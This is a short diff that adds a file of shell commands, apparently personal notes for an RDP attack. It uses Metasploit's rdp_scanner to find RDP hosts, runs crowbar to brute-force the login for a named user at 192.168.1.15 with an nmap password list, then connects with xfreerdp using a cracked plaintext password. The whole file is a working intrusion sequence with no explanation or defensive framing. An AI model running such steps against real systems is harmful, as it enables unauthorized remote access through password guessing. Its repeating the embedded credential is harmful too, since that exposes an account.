@@ -1,0 +1,9 @@
+sudo msfconsole
+search /rdp/rdp_scanner
+use 0
+set RHOSTS (ip)
+run
+exploit
+cd crowbar
+./crowbar.py --server 192.168.1.15/32 -b rdp -u RHemanth  -C /usr/share/nmap/nselib/data/passwords.lst
+sudo xfreerdp /u:RHemanth /p:832824 /v:192.168.1.15 
